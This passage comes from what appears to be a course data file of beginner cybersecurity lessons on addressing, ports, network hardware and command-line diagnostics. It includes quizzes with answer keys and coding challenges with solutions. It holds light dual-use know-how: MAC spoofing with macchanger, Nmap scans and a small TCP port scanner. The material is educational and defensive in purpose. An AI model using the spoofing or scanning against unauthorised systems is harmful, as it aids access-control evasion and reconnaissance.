                "title": "Finding and Spoofing MAC Addresses (Windows & Linux)",
                "language": "bash",
                "code": (
                    "# Windows: Inspecting physical MAC and IP:\n"
                    "getmac /v\n"
                    "ipconfig /all\n\n"
                    "# Linux: Viewing and spoofing MAC address with macchanger:\n"
                    "ip link show eth0\n"
                    "sudo ip link set dev eth0 down\n"
                    "sudo macchanger -r eth0   # Assigns a completely randomized MAC address\n"
                    "sudo ip link set dev eth0 up"
                ),
                "explanation": "Demonstrates why MAC filtering is ineffective as a standalone security control: MAC addresses are easily spoofed in minutes."
            },
            {
                "title": "Python: Identifying Private vs Public IP Addresses",
                "language": "python",
                "code": (
                    "import ipaddress\n\n"
                    "def audit_ip_type(ip_str: str) -> dict:\n"
                    "    ip = ipaddress.ip_address(ip_str)\n"
                    "    return {\n"
                    "        'ip': ip_str,\n"
                    "        'version': f'IPv{ip.version}',\n"
                    "        'is_private_rfc1918': ip.is_private,\n"
                    "        'is_global_routable': ip.is_global,\n"
                    "        'is_loopback': ip.is_loopback\n"
                    "    }\n\n"
                    "print(audit_ip_type('10.50.1.1'))\n"
                    "print(audit_ip_type('1.1.1.1'))"
                ),
                "explanation": "Network defense scripts automatically triage external vs internal communication based on RFC 1918 subnet specifications."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `is_valid_ipv4(ip_str: str) -> bool` that verifies if an input string is a valid IPv4 address (4 integer octets between 0 and 255 separated by dots, no leading zeros like '01' unless '0').",
            "starter_code": (
                "def is_valid_ipv4(ip_str: str) -> bool:\n"
                "    # Return True if valid IPv4, False otherwise\n"
                "    return False\n\n"
                "print(is_valid_ipv4('192.168.1.1'))\n"
                "print(is_valid_ipv4('256.100.0.1'))\n"
                "print(is_valid_ipv4('192.168.1'))"
            ),
            "solution_code": (
                "def is_valid_ipv4(ip_str: str) -> bool:\n"
                "    parts = ip_str.split('.')\n"
                "    if len(parts) != 4:\n"
                "        return False\n"
                "    for p in parts:\n"
                "        if not p.isdigit():\n"
                "            return False\n"
                "        if len(p) > 1 and p.startswith('0'):\n"
                "            return False\n"
                "        val = int(p)\n"
                "        if val < 0 or val > 255:\n"
                "            return False\n"
                "    return True\n\n"
                "print(is_valid_ipv4('192.168.1.1'))\n"
                "print(is_valid_ipv4('256.100.0.1'))\n"
                "print(is_valid_ipv4('192.168.1'))"
            ),
            "expected_output": "True\nFalse\nFalse"
        },
        quizzes=[
            {
                "question": "How many bits are in an IPv4 address compared to an IPv6 address?",
                "options": [
                    "IPv4 is 32 bits; IPv6 is 128 bits",
                    "IPv4 is 64 bits; IPv6 is 256 bits",
                    "IPv4 is 128 bits; IPv6 is 32 bits",
                    "Both are 48 bits"
                ],
                "correct_answer": "IPv4 is 32 bits; IPv6 is 128 bits",
                "explanation": "IPv4 uses 32-bit binary addresses (~4.3 billion combinations), while IPv6 expands to 128 bits, providing trillions of addresses per person."
            },
            {
                "question": "Which of the following IP addresses belongs to a private (non-routable) subnet under RFC 1918?",
                "options": ["192.168.1.100", "8.8.8.8", "142.250.190.46", "1.1.1.1"],
                "correct_answer": "192.168.1.100",
                "explanation": "RFC 1918 defines private address spaces: 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. 192.168.1.100 is a private Class C IP."
            },
            {
                "question": "What is the primary function of NAT (Network Address Translation)?",
                "options": [
                    "To map multiple private internal IP addresses to a single public IP address when connecting to the internet",
                    "To translate English websites into French",
                    "To generate passwords for Wi-Fi routers",
                    "To speed up the computer's CPU clock"
                ],
                "correct_answer": "To map multiple private internal IP addresses to a single public IP address when connecting to the internet",
                "explanation": "NAT conserves limited public IPv4 addresses by translating private RFC 1918 internal client addresses into a shared public gateway address."
            },
            {
                "question": "What is a MAC address?",
                "options": [
                    "A 48-bit unique physical hardware identifier assigned to a Network Interface Card (NIC)",
                    "The password used to log in to an Apple MacBook",
                    "The serial number of the computer screen",
                    "The website address of a company"
                ],
                "correct_answer": "A 48-bit unique physical hardware identifier assigned to a Network Interface Card (NIC)",
                "explanation": "The MAC address is a 48-bit physical identifier (Layer 2) burned into the NIC chipset, formatted as 6 hex octets."
            },
            {
                "question": "Why is 'MAC address filtering' considered weak security when used alone to protect a wireless network?",
                "options": [
                    "Attackers can easily sniff authorized MAC addresses transmitting in the air and spoof their own network card to match",
                    "MAC addresses change every 5 minutes automatically",
                    "Wi-Fi routers do not support MAC filtering",
                    "MAC addresses are encrypted by the Federal Communications Commission"
                ],
                "correct_answer": "Attackers can easily sniff authorized MAC addresses transmitting in the air and spoof their own network card to match",
                "explanation": "Layer 2 MAC headers are transmitted unencrypted over the air. An attacker can observe an approved client's MAC and clone it via software."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 11: Common Ports & Protocols (HTTP/HTTPS, FTP, DNS, SSH, RDP)
    # ---------------------------------------------------------
    DayBlueprint(
        order=11,
        title="Day 11: Common Ports & Protocols (HTTP/HTTPS, FTP, DNS, SSH, RDP)",
        concept="Mastering standard networking ports, distinguishing secure encrypted protocols from insecure cleartext legacy protocols, and recognizing port numbers targeted by attackers.",
        analogy="Think of an IP address as a huge skyscraper apartment building. The port numbers are the individual apartment room numbers inside: Room 80 is the public reception desk (HTTP). Room 443 is a soundproof security vault (HTTPS). Room 22 is the restricted building manager's keymaster office (SSH). If an unauthorized door is left unlocked, intruders walk right in.",
        theory_sections=[
            {
                "heading": "Well-Known Ports & Secure vs Insecure Protocols",
                "content": (
                    "There are 65,535 TCP and UDP ports. Ports 0 to 1023 are Well-Known System Ports:\n\n"
                    "- **Port 20/21 - FTP (File Transfer Protocol)**: Insecure, transmits passwords and files in cleartext. Replace with **SFTP** (Port 22).\n"
                    "- **Port 22 - SSH (Secure Shell)**: Encrypted remote CLI administration and SFTP file transfer.\n"
                    "- **Port 23 - Telnet**: Insecure, transmits all terminal commands and credentials in cleartext. Obsolete.\n"
                    "- **Port 25 - SMTP (Simple Mail Transfer Protocol)**: Sending mail between email servers.\n"
                    "- **Port 53 - DNS (Domain Name System)**: Translates human-readable domain names (google.com) into IP addresses (UDP 53).\n"
                    "- **Port 80 - HTTP**: Unencrypted cleartext web traffic. Replace with **HTTPS (Port 443)** using TLS encryption.\n"
                    "- **Port 3389 - RDP (Remote Desktop Protocol)**: Microsoft graphical remote desktop. Prime target for brute-force ransomware attacks."
                )
            },
            {
                "heading": "Port Scanning Basics (Reconnaissance)",
                "content": (
                    "Attackers and penetration testers perform **Port Scanning** (using tools like `Nmap`) to discover which ports are in an `OPEN`, `CLOSED`, or `FILTERED` state on a target server. Discovering an open port 21 or 23 indicates outdated, easily sniffed services."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Scanning Ports with Nmap and Checking Local Open Ports",
                "language": "bash",
                "code": (
                    "# Inspecting open ports listening locally on Windows:\n"
                    "netstat -ano | findstr \"LISTENING\"\n\n"
                    "# Inspecting open listening ports on Linux:\n"
                    "ss -tulnp\n\n"
                    "# Scanning a target server using Nmap for open ports:\n"
                    "nmap -sV -p 21,22,25,53,80,443,3389 scanme.nmap.org"
                ),
                "explanation": "Standard recon commands to discover listening services and verify service version banners."
            },
            {
                "title": "Python: Building a Simple TCP Port Scanner",
                "language": "python",
                "code": (
                    "import socket\n\n"
                    "def check_port(target_host: str, port: int) -> bool:\n"
                    "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                    "    s.settimeout(1.0)\n"
                    "    try:\n"
                    "        result = s.connect_ex((target_host, port))\n"
                    "        s.close()\n"
                    "        return result == 0  # 0 indicates connection success (port OPEN)\n"
                    "    except Exception:\n"
                    "        return False\n\n"
                    "print('Port 80 (HTTP) Open:', check_port('scanme.nmap.org', 80))\n"
                    "print('Port 23 (Telnet) Open:', check_port('scanme.nmap.org', 23))"
                ),
                "explanation": "Core socket programming demonstrating how vulnerability scanners determine whether target TCP ports are open."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `audit_service_security(port: int) -> dict` that returns a dict `{'port': port, 'service': str, 'is_secure': bool}` for ports 21 (FTP), 22 (SSH), 23 (Telnet), 80 (HTTP), 443 (HTTPS), and 3389 (RDP). Secure services are SSH and HTTPS.",
            "starter_code": (
                "def audit_service_security(port: int) -> dict:\n"
                "    # Return {'port': port, 'service': name, 'is_secure': True/False}\n"
                "    return {}\n\n"
                "print(audit_service_security(22))\n"
                "print(audit_service_security(80))"
            ),
            "solution_code": (
                "def audit_service_security(port: int) -> dict:\n"
                "    port_db = {\n"
                "        21: ('FTP', False),\n"
                "        22: ('SSH', True),\n"
                "        23: ('Telnet', False),\n"
                "        80: ('HTTP', False),\n"
                "        443: ('HTTPS', True),\n"
                "        3389: ('RDP', False)  # Plain RDP frequently brute-forced unless shielded with MFA/VPN\n"
                "    }\n"
                "    name, secure = port_db.get(port, ('Unknown', False))\n"
                "    return {'port': port, 'service': name, 'is_secure': secure}\n\n"
                "print(audit_service_security(22))\n"
                "print(audit_service_security(80))"
            ),
            "expected_output": "{'port': 22, 'service': 'SSH', 'is_secure': True}\n{'port': 80, 'service': 'HTTP', 'is_secure': False}"
        },
        quizzes=[
            {
                "question": "Which port number is utilized by standard secure encrypted web browsing (HTTPS)?",
                "options": ["Port 443", "Port 80", "Port 22", "Port 53"],
                "correct_answer": "Port 443",
                "explanation": "HTTPS runs over TCP port 443, encrypting web traffic with TLS/SSL, whereas unencrypted HTTP runs over port 80."
            },
            {
                "question": "Why is using Telnet (Port 23) considered a severe security risk in modern networking?",
                "options": [
                    "Telnet sends all usernames, passwords, and terminal commands across the network in cleartext without encryption",
                    "Telnet consumes all computer hard drive space",
                    "Telnet cannot connect to routers",
                    "Telnet requires an analog telephone dial-up modem"
                ],
                "correct_answer": "Telnet sends all usernames, passwords, and terminal commands across the network in cleartext without encryption",
                "explanation": "Anyone with a packet sniffer (like Wireshark) on the path can read Telnet credentials in plaintext. It has been replaced by SSH (Port 22)."
            },
            {
                "question": "What protocol and standard port number are responsible for resolving domain names like 'example.com' into numerical IP addresses?",
                "options": ["DNS on Port 53", "DHCP on Port 67", "FTP on Port 21", "NTP on Port 123"],
                "correct_answer": "DNS on Port 53",
                "explanation": "Domain Name System (DNS) operates on UDP port 53 (and TCP port 53 for large transfers), mapping domain names to IP addresses."
            },
            {
                "question": "Which port is used by Microsoft Remote Desktop Protocol (RDP), making it a frequent target for ransomware brute-force attacks?",
                "options": ["Port 3389", "Port 22", "Port 8080", "Port 445"],
                "correct_answer": "Port 3389",
                "explanation": "RDP listens on TCP 3389. Exposing port 3389 directly to the public internet without a VPN or MFA is a leading vector for ransomware intrusion."
            },
            {
                "question": "What is the maximum number of available TCP or UDP network ports on a single operating system?",
                "options": ["65,535", "1,024", "4,096", "1,000,000"],
                "correct_answer": "65,535",
                "explanation": "Port numbers are 16-bit unsigned integers, ranging from port 0 to 65535 (2^16 - 1)."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 12: Network Devices (Switches, Routers, Modems, Access Points)
    # ---------------------------------------------------------
    DayBlueprint(
        order=12,
        title="Day 12: Network Devices (Switches, Routers, Modems, Access Points)",
        concept="Understanding the functional hardware roles of Network Switches (Layer 2), Routers (Layer 3), Modems, and Wireless Access Points (WAPs), and how each device enforces security boundaries.",
        analogy="Think of a city transport network: A Switch is an intersection roundabout directing cars between local neighborhood houses on the same street. A Router is an interstate highway interchange with border patrol checkpoints connecting your city to another state. A Modem is the translator converting train tracks into river boats. A WAP is a radio broadcast tower.",
        theory_sections=[
            {
                "heading": "Core Network Hardware and OSI Layers",
                "content": (
                    "Modern enterprise networks rely on distinct physical infrastructure appliances:\n\n"
                    "1. **Network Switch (Layer 2)**: Interconnects devices on the same local network (LAN). Inspects incoming Ethernet frame headers and maintains a **CAM (Content Addressable Memory) Table** mapping MAC addresses to physical switch ports. Unicast traffic is sent ONLY to the recipient port.\n"
                    "2. **Router (Layer 3)**: Connects different subnets and networks together (e.g., LAN to WAN). Reads IP packets and consults its **Routing Table** to determine the optimal next-hop path. Often acts as a gateway and NAT device.\n"
                    "3. **Modem (Modulator/Demodulator)**: Translates analog signals from ISPs (cable coax, fiber optic light pulses, DSL copper) into digital Ethernet bits for your router.\n"
                    "4. **Wireless Access Point (WAP)**: Extends a wired Ethernet LAN into the air via 2.4 GHz, 5 GHz, or 6 GHz Wi-Fi radio frequencies."
                )
            },
            {
                "heading": "Security Exploits on Network Hardware",
                "content": (
                    "- **MAC Flooding Attack**: An attacker floods a switch with thousands of bogus MAC addresses. The switch's CAM table overflows, forcing the switch into **Fail-Open (Hub)** mode where it broadcasts all confidential traffic to all ports.\n"
                    "- **Router Default Credential Exploitation**: Routers deployed with factory default credentials (e.g., `admin/admin`) are hijacked by botnets like Mirai to launch massive DDoS attacks."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Inspecting Local Gateway and Routing Tables",
                "language": "bash",
                "code": (
                    "# Windows: Inspecting default gateway router and route table:\n"
                    "ipconfig | findstr \"Default Gateway\"\n"
                    "route print\n\n"
                    "# Linux: Viewing default route and ARP table:\n"
                    "ip route show\n"
                    "arp -a    # Inspects IP-to-MAC resolution table"
                ),
                "explanation": "Verifying default routes ensures network traffic passes through authorized firewall gateways rather than rogue gateways."
            },
            {
                "title": "Python: Simulating a Switch CAM Table Lookup",
                "language": "python",
                "code": (
                    "class SimpleSwitch:\n"
                    "    def __init__(self):\n"
                    "        self.cam_table = {}  # MAC -> Port\n"
                    "    \n"
                    "    def forward_frame(self, src_mac: str, dst_mac: str, ingress_port: int) -> str:\n"
                    "        # Learn source MAC\n"
                    "        self.cam_table[src_mac] = ingress_port\n"
                    "        \n"
                    "        # Forward decision\n"
                    "        if dst_mac in self.cam_table:\n"
                    "            return f'Unicast to Port {self.cam_table[dst_mac]}'\n"
                    "        return 'Flood / Broadcast to all other ports (Unknown Destination)'\n\n"
                    "switch = SimpleSwitch()\n"
                    "print(switch.forward_frame('00:AA:BB:11', '00:CC:DD:22', 1))\n"
                    "switch.cam_table['00:CC:DD:22'] = 3\n"
                    "print(switch.forward_frame('00:AA:BB:11', '00:CC:DD:22', 1))"
                ),
                "explanation": "Illustrates how Layer 2 switches learn hardware locations to prevent eavesdropping by unconcerned switch ports."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `route_packet(destination_ip: str, routing_table: dict) -> str` that inspects a dictionary of subnet prefixes (e.g., {'192.168.1.0/24': 'eth0', '10.0.0.0/8': 'eth1', '0.0.0.0/0': 'wan0'}) and returns the appropriate egress interface name.",
            "starter_code": (
                "import ipaddress\n\n"
                "def route_packet(destination_ip: str, routing_table: dict) -> str:\n"
                "    # Return interface matching destination, or default '0.0.0.0/0'\n"
                "    return ''\n\n"
                "table = {'192.168.1.0/24': 'eth0', '10.0.0.0/8': 'eth1', '0.0.0.0/0': 'wan0'}\n"
                "print(route_packet('192.168.1.55', table))\n"
                "print(route_packet('8.8.8.8', table))"
            ),
            "solution_code": (
                "import ipaddress\n\n"
                "def route_packet(destination_ip: str, routing_table: dict) -> str:\n"
                "    dest = ipaddress.ip_address(destination_ip)\n"
                "    best_interface = routing_table.get('0.0.0.0/0', 'default')\n"
                "    longest_prefix = -1\n"
                "    for cidr, interface in routing_table.items():\n"
                "        net = ipaddress.ip_network(cidr)\n"
                "        if dest in net and net.prefixlen > longest_prefix:\n"
                "            longest_prefix = net.prefixlen\n"
                "            best_interface = interface\n"
                "    return best_interface\n\n"
                "table = {'192.168.1.0/24': 'eth0', '10.0.0.0/8': 'eth1', '0.0.0.0/0': 'wan0'}\n"
                "print(route_packet('192.168.1.55', table))\n"
                "print(route_packet('8.8.8.8', table))"
            ),
            "expected_output": "eth0\nwan0"
        },
        quizzes=[
            {
                "question": "At which layer of the OSI model does a standard network switch operate to forward frames based on MAC addresses?",
                "options": ["Layer 2 (Data Link Layer)", "Layer 3 (Network Layer)", "Layer 1 (Physical Layer)", "Layer 7 (Application Layer)"],
                "correct_answer": "Layer 2 (Data Link Layer)",
                "explanation": "Standard switches operate at Layer 2, maintaining a CAM table of MAC addresses to direct Ethernet frames to specific ports."
            },
            {
                "question": "What is the primary role of a Router in computer networking?",
                "options": [
                    "To connect different logical IP networks together and forward packets toward their destination using IP routing tables",
                    "To modulate light pulses in fiber cables",
                    "To provide power to desktop computers",
                    "To clean physical Ethernet cables"
                ],
                "correct_answer": "To connect different logical IP networks together and forward packets toward their destination using IP routing tables",
                "explanation": "Routers operate at Layer 3, examining destination IP addresses and determining the optimal next-hop route across different subnets."
            },
            {
                "question": "What occurs when an attacker launches a 'MAC Flooding' attack against an unhardened network switch?",
                "options": [
                    "The switch's CAM table fills up with bogus MAC addresses, causing it to fail-open and broadcast all subsequent traffic to every port like an insecure hub",
                    "The switch catches on fire",
                    "The router password resets to blank",
                    "The internet cable permanently breaks"
                ],
                "correct_answer": "The switch's CAM table fills up with bogus MAC addresses, causing it to fail-open and broadcast all subsequent traffic to every port like an insecure hub",
                "explanation": "When CAM memory overflows, the switch can no longer remember specific port mappings and broadcasts all frames to all ports, allowing packet sniffing."
            },
            {
                "question": "What is the function of a Modem (Modulator-Demodulator)?",
                "options": [
                    "To convert digital signals from a computer network into analog signals suitable for transmission over ISP cable/phone lines, and vice versa",
                    "To block viruses from USB drives",
                    "To monitor keyboard keystrokes",
                    "To manage user passwords in Active Directory"
                ],
                "correct_answer": "To convert digital signals from a computer network into analog signals suitable for transmission over ISP cable/phone lines, and vice versa",
                "explanation": "Modems bridge the physical transmission medium of the ISP (cable, DSL, fiber) with digital local Ethernet networking."
            },
            {
                "question": "What security switch feature mitigates MAC Flooding attacks by limiting the number of allowed MAC addresses per physical port?",
                "options": ["Port Security (Sticky MAC)", "Spanning Tree Protocol", "Dynamic DNS", "BGP Peering"],
                "correct_answer": "Port Security (Sticky MAC)",
                "explanation": "Cisco and enterprise switches feature 'Port Security', which shuts down a port or drops traffic if an unauthorized or excessive number of MAC addresses appear."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 13: Project: Command Line Network Tools Lab (ping, ipconfig/ifconfig, tracert, nslookup)
    # ---------------------------------------------------------
    DayBlueprint(
        order=13,
        title="Day 13 (Project): Command Line Network Tools Lab (ping, ipconfig/ifconfig, tracert, nslookup)",
        concept="Hands-on diagnostic triage using core command-line networking utilities: ping (ICMP reachability), ipconfig/ifconfig (interface auditing), tracert/traceroute (hop path discovery), and nslookup/dig (DNS resolution).",
        analogy="You are an emergency emergency medical doctor for the network. `ipconfig` is checking the patient's own ID badge. `ping` is tapping their shoulder to see if they respond. `tracert` is taking an X-ray of their entire spine vertebrae to see where the nerve is pinched. `nslookup` is verifying their address in the city directory.",
        theory_sections=[
            {
                "heading": "The Diagnostic Toolkit of Network & Security Analysts",
                "content": (
                    "When troubleshooting outages or scoping incidents, four CLI tools provide immediate ground truth:\n\n"
                    "1. **`ping` (ICMP Echo Request/Reply)**: Tests end-to-end Layer 3 reachability and measures Round-Trip Time (RTT) latency. High packet loss indicates congestion, physical cable faults, or firewall filtering.\n"
                    "2. **`ipconfig` / `ifconfig` / `ip a`**: Displays local IP addresses, subnet masks, default gateways, DNS servers, and DHCP lease expiration.\n"
                    "3. **`tracert` (Windows) / `traceroute` (Linux)**: Maps every intermediate router hop between your device and the destination. Works by incrementing the IP header's **TTL (Time to Live)** field by 1 on successive packets.\n"
                    "4. **`nslookup` / `dig`**: Queries DNS servers to test name resolution, locate mail exchange (MX) servers, and investigate suspicious domains."
                )
            },
            {
                "heading": "Security Reconnaissance vs Firewall Evasion",
                "content": (
                    "Security analysts use `tracert` to pinpoint where firewall rules are dropping packets. Attackers use `nslookup` to harvest organizational subdomains (e.g., `vpn.company.com`, `mail.company.com`) during reconnaissance. Many hardened enterprise firewalls block inbound ICMP Echo (`ping`) to conceal server existence from automated scanners."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Core Network Diagnostics Hands-On CLI Lab",
                "language": "bash",
                "code": (
                    "# Step 1: Check your local IP and default gateway:\n"
                    "ipconfig /all\n\n"
                    "# Step 2: Ping local gateway (proves local LAN and switch work):\n"
                    "ping 192.168.1.1\n\n"
                    "# Step 3: Ping public IP (proves WAN and internet routing work):\n"
                    "ping 8.8.8.8\n\n"
                    "# Step 4: Test DNS name resolution:\n"
                    "nslookup google.com\n\n"
                    "# Step 5: Trace the path to destination across internet routers:\n"
                    "tracert 1.1.1.1"
                ),
                "explanation": "The standard 5-step triage methodology every IT professional uses to diagnose connectivity and name resolution failures."
            },
            {
                "title": "Python: Building an Automated Network Health & Latency Probe",
                "language": "python",
                "code": (
                    "import subprocess\n"
                    "import platform\n\n"
                    "def ping_host(host: str) -> dict:\n"
                    "    param = '-n' if platform.system().lower() == 'windows' else '-c'\n"
                    "    command = ['ping', param, '1', host]\n"
                    "    try:\n"
                    "        res = subprocess.run(command, capture_output=True, text=True, timeout=3)\n"
                    "        is_alive = res.returncode == 0\n"
                    "        return {'host': host, 'status': 'ONLINE' if is_alive else 'OFFLINE'}\n"
                    "    except Exception as e:\n"
                    "        return {'host': host, 'status': f'ERROR: {e}'}\n\n"
                    "print(ping_host('1.1.1.1'))\n"
                    "print(ping_host('192.0.2.1')) # Test non-existent address"
                ),
                "explanation": "Automates host liveness verification for network monitoring scripts."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `parse_ping_latency(ping_output: str) -> float` that parses sample ping output text (e.g., 'Reply from 8.8.8.8: bytes=32 time=18.4ms TTL=117') and returns the latency value as a float (18.4). If no latency is found, return -1.0.",
            "starter_code": (
                "import re\n\n"
                "def parse_ping_latency(ping_output: str) -> float:\n"
                "    # Extract time in ms from ping output text\n"
                "    return -1.0\n\n"
                "sample = 'Reply from 8.8.8.8: bytes=32 time=24.5ms TTL=56'\n"
                "print(parse_ping_latency(sample))"
            ),
            "solution_code": (
                "import re\n\n"
                "def parse_ping_latency(ping_output: str) -> float:\n"
                "    match = re.search(r'time[=<]([0-9.]+)\\s*ms', ping_output, re.IGNORECASE)\n"
                "    if match:\n"
                "        return float(match.group(1))\n"
                "    return -1.0\n\n"
                "sample = 'Reply from 8.8.8.8: bytes=32 time=24.5ms TTL=56'\n"
                "print(parse_ping_latency(sample))"
            ),
            "expected_output": "24.5"
        },
        quizzes=[
            {
                "question": "Which network protocol does the `ping` utility utilize to test end-to-end host reachability?",
                "options": ["ICMP (Internet Control Message Protocol)", "TCP (Transmission Control Protocol)", "SNMP (Simple Network Management Protocol)", "FTP (File Transfer Protocol)"],
                "correct_answer": "ICMP (Internet Control Message Protocol)",
                "explanation": "`ping` sends ICMP Echo Request (Type 8) packets and listens for ICMP Echo Reply (Type 0) packets from the destination."
            },
            {
                "question": "How does the `tracert` (or `traceroute`) command discover each intermediate router hop along the path to a destination?",
                "options": [
                    "By progressively incrementing the IP packet's Time to Live (TTL) field starting from 1 and listening for ICMP Time Exceeded messages",
                    "By asking Google Maps for driving directions",
                    "By reading the computer's hard drive serial number",
                    "By calling the internet service provider"
                ],
                "correct_answer": "By progressively incrementing the IP packet's Time to Live (TTL) field starting from 1 and listening for ICMP Time Exceeded messages",
                "explanation": "Routers decrement TTL by 1. When TTL reaches 0, the router drops the packet and responds with an ICMP Time Exceeded message, revealing its IP."
            },
            {
                "question": "If you can successfully ping an external IP address (such as `8.8.8.8`), but attempting to ping `google.com` fails, what is the root cause?",
                "options": [
                    "DNS name resolution failure",
                    "Your physical Ethernet cable is unplugged",
                    "Your computer has run out of RAM",
                    "The local router power supply is broken"
                ],
                "correct_answer": "DNS name resolution failure",
                "explanation": "Successfully pinging an IP confirms Layer 1, 2, and 3 routing work. Failing on domain names proves the DNS resolver is unconfigured or failing."
            },
            {
                "question": "What command-line tool is specifically designed to query DNS records such as A, MX, TXT, and CNAME?",
                "options": ["`nslookup` (or `dig`)", "`netstat`", "`ipconfig`", "`arp`"],
                "correct_answer": "`nslookup` (or `dig`)",
                "explanation": "`nslookup` and `dig` query DNS servers to retrieve domain mappings, mail exchangers, and domain ownership verification TXT records."
            },
            {
                "question": "Why might a perfectly operational enterprise web server fail to respond to `ping` requests from home computers?",
                "options": [
                    "The enterprise firewall is configured to block inbound ICMP Echo requests to protect against scanning and DoS attacks",
                    "The server only works on holidays",
                    "The server has too many hard drives",
                    "ICMP packets cannot travel through glass fiber cables"
                ],
                "correct_answer": "The enterprise firewall is configured to block inbound ICMP Echo requests to protect against scanning and DoS attacks",
                "explanation": "Hardened firewalls routinely drop ICMP traffic. Dropping pings does not mean HTTP/HTTPS web services are down."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 14: What is Cyber Security? (Definition & Importance)
    # ---------------------------------------------------------
    DayBlueprint(
        order=14,
        title="Day 14: What is Cyber Security? (Definition & Importance)",
        concept="Defining cybersecurity, analyzing the modern threat landscape, understanding the financial and societal impact of breaches, and exploring the multifaceted domains of defensive engineering.",
        analogy="Cybersecurity is not just a digital deadbolt on your front door. It is the comprehensive defensive system of an armored bank: concrete vaults, armed security guards, motion detectors, audit logs, background checks on tellers, counterfeit bill detectors, and rapid-response armored cars.",
        theory_sections=[
            {
                "heading": "Defining Modern Cybersecurity",
                "content": (
                    "**Cybersecurity** is the practice of protecting critical systems, networks, devices, and data from unauthorized digital attacks, damage, or unauthorized access.\n\n"
                    "Key sub-domains include:\n"
                    "1. **Network Security**: Securing internal boundaries, firewalls, and traffic encryption.\n"
                    "2. **Application Security (AppSec)**: Ensuring software code is free of design flaws and injection bugs.\n"
                    "3. **Information / Data Security**: Protecting sensitive records (PII, PHI, intellectual property) from leaks via encryption and access controls.\n"
                    "4. **Operational Security (OpSec)**: Managing day-to-day access rights and classification of sensitive assets.\n"
                    "5. **Disaster Recovery & Business Continuity**: Preparing procedures to restore operations after outages or ransomware extortion."
                )
            },
            {
                "heading": "The Business and Societal Cost of Cybercrime",
                "content": (
                    "Global cybercrime damages exceed $8 trillion annually. Breaches cause:\n"
                    "- Direct financial theft and ransomware extortion payments.\n"
                    "- Regulatory fines under laws like GDPR ($20M+ or 4% of annual global turnover).\n"
                    "- Catastrophic reputational collapse and customer churn.\n"
                    "- Disruption of critical national infrastructure (hospitals, water treatment facilities, electrical power grids)."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Security Hygiene Checklist via PowerShell & Bash",
                "language": "bash",
                "code": (
                    "# Windows: Auditing security status of Windows Defender and Firewall:\n"
                    "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled\n"
                    "Get-NetFirewallProfile | Select-Object Name, Enabled\n\n"
                    "# Linux: Verifying firewall and listening daemon status:\n"
                    "sudo ufw status verbose\n"
                    "sudo netstat -tulpn"
                ),
                "explanation": "Basic hygiene audits verify that baseline defensive controls (firewall, antivirus) are actively engaged on endpoints."
            },
            {
                "title": "Python: Estimating Financial Breach Cost by Record Count",
                "language": "python",
                "code": (
                    "def estimate_breach_cost(records_compromised: int, industry: str) -> dict:\n"
                    "    # IBM Security Cost of a Data Breach benchmarks (~$165 per record average)\n"
                    "    cost_per_record = {'healthcare': 210, 'financial': 190, 'retail': 140}\n"
                    "    rate = cost_per_record.get(industry.lower(), 165)\n"
                    "    estimated_total = records_compromised * rate\n"
                    "    return {\n"
                    "        'records': records_compromised,\n"
                    "        'cost_per_record_usd': rate,\n"
                    "        'estimated_total_loss_usd': estimated_total\n"
                    "    }\n\n"
                    "print(estimate_breach_cost(50000, 'healthcare'))"
                ),
                "explanation": "Calculates organizational risk exposure based on empirical cybersecurity loss modeling."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `evaluate_security_posture(controls_enabled: dict) -> str` that assesses posture based on required keys: 'firewall', 'mfa', 'antivirus', and 'backups'. Returns 'CRITICAL' if any control is False, otherwise 'COMPLIANT'.",
            "starter_code": (
                "def evaluate_security_posture(controls_enabled: dict) -> str:\n"
                "    # Return 'COMPLIANT' or 'CRITICAL'\n"
                "    return ''\n\n"
                "print(evaluate_security_posture({'firewall': True, 'mfa': True, 'antivirus': True, 'backups': True}))\n"
                "print(evaluate_security_posture({'firewall': True, 'mfa': False, 'antivirus': True, 'backups': True}))"
            ),
            "solution_code": (
                "def evaluate_security_posture(controls_enabled: dict) -> str:\n"
                "    required = ['firewall', 'mfa', 'antivirus', 'backups']\n"
                "    for req in required:\n"
                "        if not controls_enabled.get(req, False):\n"
                "            return 'CRITICAL'\n"
                "    return 'COMPLIANT'\n\n"
                "print(evaluate_security_posture({'firewall': True, 'mfa': True, 'antivirus': True, 'backups': True}))\n"
                "print(evaluate_security_posture({'firewall': True, 'mfa': False, 'antivirus': True, 'backups': True}))"
            ),
            "expected_output": "COMPLIANT\nCRITICAL"
        },
        quizzes=[
            {
                "question": "What is the primary overarching goal of Cybersecurity?",
                "options": [
                    "Protecting digital systems, networks, devices, and sensitive data from unauthorized access, damage, or theft",
                    "Writing computer games for teenagers",
                    "Selling higher internet bandwidth packages",
                    "Replacing all human employees with robot arms"
                ],
                "correct_answer": "Protecting digital systems, networks, devices, and sensitive data from unauthorized access, damage, or theft",
                "explanation": "Cybersecurity encompasses all technical and administrative controls designed to ensure system integrity, privacy, and operational resilience."
            },
            {
                "question": "Which cybersecurity sub-domain focuses on identifying and remediating security bugs within source code before software deployment?",
                "options": ["Application Security (AppSec)", "Physical Security", "Cloud Infrastructure Hosting", "Disaster Relief Management"],
                "correct_answer": "Application Security (AppSec)",
                "explanation": "AppSec involves secure coding practices, static code analysis (SAST), and penetration testing of custom applications."
            },
            {
                "question": "Why is cybersecurity considered a critical matter of national security rather than merely an IT problem?",
                "options": [
                    "Cyberattacks can disable critical national infrastructure like power grids, nuclear plants, hospitals, and water filtration systems",
                    "Hackers can change the colors of traffic lights on television shows",
                    "Computer cables cost more than military tanks",
                    "Government websites use more electricity than cities"
                ],
                "correct_answer": "Cyberattacks can disable critical national infrastructure like power grids, nuclear plants, hospitals, and water filtration systems",
